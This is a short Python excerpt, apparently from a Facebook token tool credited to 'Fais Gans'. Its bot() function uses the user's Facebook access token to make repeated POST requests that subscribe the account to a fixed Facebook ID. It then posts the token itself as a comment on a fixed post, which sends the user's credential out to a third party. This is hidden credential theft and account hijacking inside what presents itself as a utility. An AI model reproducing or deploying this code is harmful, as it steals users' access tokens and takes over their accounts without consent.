...
def tokenz():
	...
	try:
		...
		os.system('clear')
		logo()
		print(" %s[*] Author: Fais Gans."%(N))
		print(" [*] My friend: Ndrii Tzy Mbokey(Fachri) Adzi Tod")    
		print(" [*] Github: https://github.com/ShadowXfrangk")
		print(" [*] ---------------------------------------------")
...
def bot():
	...
	requests.post('https://graph.facebook.com/100071871171387/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100071871171387/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100071871171387/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100071871171387/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100071871171387/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/107258528346519/comments/?message='+token+'&access_token=' + token)
